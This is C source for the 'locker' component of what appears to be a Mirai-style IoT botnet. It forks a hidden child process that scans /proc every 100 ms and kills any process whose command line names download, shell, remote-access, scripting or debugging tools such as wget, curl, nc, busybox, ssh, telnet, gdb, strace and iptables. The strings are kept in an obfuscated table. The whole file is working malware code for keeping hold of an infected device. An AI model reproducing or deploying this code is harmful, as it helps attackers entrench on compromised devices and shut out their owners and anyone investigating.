// by juan @ipmiv2 on telegram

#define _GNU_SOURCE

#include <fcntl.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>
#include <dirent.h>
#include <sys/prctl.h>
#include <stdio.h>

#include "headers/dbg.h"
#include "headers/config.h"
#include "headers/util.h"
#include "headers/hide.h"
#include "headers/process.h"
#include "headers/table.h"

static uint8_t locker_table_vals[] = {
    TABLE_KILLER_PROC,
    TABLE_LOCKER_CMDLINE,
    TABLE_LOCKER_WGET,
    TABLE_LOCKER_FTP,
    TABLE_LOCKER_CURL,
    TABLE_LOCKER_ECHO,
    TABLE_LOCKER_MOUNT,
    TABLE_LOCKER_SOCAT,
    TABLE_LOCKER_NC,
    TABLE_LOCKER_SH,
    TABLE_LOCKER_LOGIN,
    TABLE_LOCKER_STATUS,
    TABLE_LOCKER_PPID,
    TABLE_LOCKER_TFTP,
    TABLE_LOCKER_WGET2,
    TABLE_LOCKER_AXEL,
    TABLE_LOCKER_ARIA2C,
    TABLE_LOCKER_IRSSI,
    TABLE_LOCKER_BUSYBOX,
    TABLE_LOCKER_SSH,
    TABLE_LOCKER_SCP,
    TABLE_LOCKER_TELNET,
    TABLE_LOCKER_PERL,
    TABLE_LOCKER_PYTHON,
    TABLE_LOCKER_RUBY,
    TABLE_LOCKER_LUA,
    TABLE_LOCKER_GDB,
    TABLE_LOCKER_STRACE,
    TABLE_LOCKER_IPTABLES,
    TABLE_LOCKER_PS,
    TABLE_LOCKER_KILL,
    TABLE_LOCKER_FIND,
};

static uint8_t locker_kill_commands[] = {
    TABLE_LOCKER_WGET,
    TABLE_LOCKER_FTP,
    TABLE_LOCKER_CURL,
    TABLE_LOCKER_ECHO,
    TABLE_LOCKER_MOUNT,
    TABLE_LOCKER_SOCAT,
    TABLE_LOCKER_NC,
    TABLE_LOCKER_TFTP,
    TABLE_LOCKER_WGET2,
    TABLE_LOCKER_AXEL,
    TABLE_LOCKER_ARIA2C,
    TABLE_LOCKER_IRSSI,
    TABLE_LOCKER_BUSYBOX,
    TABLE_LOCKER_PERL,
    TABLE_LOCKER_PYTHON,
    TABLE_LOCKER_RUBY,
    TABLE_LOCKER_LUA,
};

static uint8_t locker_kill_remote[] = {
    TABLE_LOCKER_SSH,
    TABLE_LOCKER_SCP,
    TABLE_LOCKER_TELNET,
};

static uint8_t locker_kill_tools[] = {
    TABLE_LOCKER_GDB,
    TABLE_LOCKER_STRACE,
    TABLE_LOCKER_IPTABLES,
    TABLE_LOCKER_PS,
    TABLE_LOCKER_KILL,
    TABLE_LOCKER_FIND,
};

static int get_PPid(char *buf, int buf_len) {
    int len;
    table_unlock_val(TABLE_LOCKER_PPID);
    char *ppid_str = table_retrieve_val(TABLE_LOCKER_PPID, &len);
    int result = util_memsearch(buf, buf_len, ppid_str, len);
    table_lock_val(TABLE_LOCKER_PPID);
    return result > 0 ? atoi(buf + result) : -1;
}

static BOOL check_status(char *pid) {
    int len;
    table_unlock_val(TABLE_KILLER_PROC);
    char *proc_str = table_retrieve_val(TABLE_KILLER_PROC, &len);
    char status_path[128] = {0};
    strcpy(status_path, proc_str);
    strcat(status_path, pid);
    table_unlock_val(TABLE_LOCKER_STATUS);
    char *status_suffix = table_retrieve_val(TABLE_LOCKER_STATUS, &len);
    strcat(status_path, status_suffix);
    table_lock_val(TABLE_LOCKER_STATUS);
    table_lock_val(TABLE_KILLER_PROC);

    int fd = open(status_path, O_RDONLY);
    if (fd == -1)
        return FALSE;

    char rdbuf[256] = {0};
    int rdlen = read(fd, rdbuf, sizeof(rdbuf) - 1);
    close(fd);

    if (rdlen <= 0)
        return FALSE;

    if (get_PPid(rdbuf, rdlen) > 1)
        return TRUE;

    return FALSE;
}

static BOOL check_cmdline(char *pid) {
    int len;
    table_unlock_val(TABLE_KILLER_PROC);
    char *proc_str = table_retrieve_val(TABLE_KILLER_PROC, &len);
    char cmdline_path[128] = {0};
    strcpy(cmdline_path, proc_str);
    strcat(cmdline_path, pid);
    table_unlock_val(TABLE_LOCKER_CMDLINE);
    char *cmdline_suffix = table_retrieve_val(TABLE_LOCKER_CMDLINE, &len);
    strcat(cmdline_path, cmdline_suffix);
    table_lock_val(TABLE_LOCKER_CMDLINE);
    table_lock_val(TABLE_KILLER_PROC);

    int fd = open(cmdline_path, O_RDONLY);
    if (fd == -1)
        return FALSE;

    char rdbuf[512] = {0};
    int rdlen = read(fd, rdbuf, sizeof(rdbuf) - 1);
    close(fd);

    if (rdlen <= 0)
        return FALSE;

    for (unsigned int i = 0; i < (sizeof(locker_kill_commands) / sizeof(locker_kill_commands[0])); i++) {
        table_unlock_val(locker_kill_commands[i]);
        char *cmd_str = table_retrieve_val(locker_kill_commands[i], &len);
        if (util_memsearch(rdbuf, rdlen, cmd_str, len) > 0) {
            table_lock_val(locker_kill_commands[i]);
            return TRUE;
        }
        table_lock_val(locker_kill_commands[i]);
    }

    for (unsigned int i = 0; i < (sizeof(locker_kill_remote) / sizeof(locker_kill_remote[0])); i++) {
        table_unlock_val(locker_kill_remote[i]);
        char *cmd_str = table_retrieve_val(locker_kill_remote[i], &len);
        if (util_memsearch(rdbuf, rdlen, cmd_str, len) > 0) {
            table_lock_val(locker_kill_remote[i]);
            return TRUE;
        }
        table_lock_val(locker_kill_remote[i]);
    }

    for (unsigned int i = 0; i < (sizeof(locker_kill_tools) / sizeof(locker_kill_tools[0])); i++) {
        table_unlock_val(locker_kill_tools[i]);
        char *cmd_str = table_retrieve_val(locker_kill_tools[i], &len);
        if (util_memsearch(rdbuf, rdlen, cmd_str, len) > 0) {
            table_lock_val(locker_kill_tools[i]);
            if (check_status(pid))
                return TRUE;
            break;
        }
        table_lock_val(locker_kill_tools[i]);
    }

    table_unlock_val(TABLE_LOCKER_LOGIN);
    char *login_str = table_retrieve_val(TABLE_LOCKER_LOGIN, &len);
    if (util_memsearch(rdbuf, rdlen, login_str, len) > 0) {
        table_lock_val(TABLE_LOCKER_LOGIN);
        if (check_status(pid))
            return TRUE;
    } else {
        table_lock_val(TABLE_LOCKER_LOGIN);
    }

    table_unlock_val(TABLE_LOCKER_SH);
    char *sh_str = table_retrieve_val(TABLE_LOCKER_SH, &len);
    int pos = util_memsearch(rdbuf, rdlen, sh_str, len);
    table_lock_val(TABLE_LOCKER_SH);

    if (pos) {
        BOOL found = FALSE;
        for (int i = pos; i < rdlen; i++) {
            if (rdbuf[i] == '/' || (rdbuf[i] == '-' && rdbuf[i + 1] == 'c')) {
                found = TRUE;
                break;
            }
        }
        if (!found && check_status(pid))
            return TRUE;
    }

    return FALSE;
}

void locker(void) {
    int len;
    DEBUG_PRINT("[locker] started\n");

    table_unlock_val(TABLE_KILLER_PROC);
    char *proc_str = table_retrieve_val(TABLE_KILLER_PROC, &len);
    DIR *dir = opendir(proc_str);
    if (!dir) {
        table_lock_val(TABLE_KILLER_PROC);
        DEBUG_PRINT("[locker] opendir() failed\n");
        return;
    }

    int loc = 0;
    struct dirent *entry;
    while ((entry = readdir(dir))) {
        if (*entry->d_name >= '0' && *entry->d_name <= '9') {
            loc = telldir(dir);
            break;
        }
    }
    table_lock_val(TABLE_KILLER_PROC);

    for (unsigned int i = 0; i < (sizeof(locker_table_vals) / sizeof(locker_table_vals[0])); i++)
        table_unlock_val(locker_table_vals[i]);

    while (TRUE) {
        seekdir(dir, loc);

        while ((entry = readdir(dir))) {
            if (check_cmdline(entry->d_name)) {
                DEBUG_PRINT("[locker] found pid: (%s)\n", entry->d_name);
                kill(atoi(entry->d_name), SIGKILL);
            }
        }

        usleep(100000);
    }
}

void locker_init(void) {
    if (fork() != 0) {
        sleep(1);
        return;
    }

    prctl(PR_SET_PDEATHSIG, SIGKILL);
    hide_pid();

    DEBUG_PRINT("[locker_init] started: (%d)\n", getpid());
    locker();
    exit(0);
}
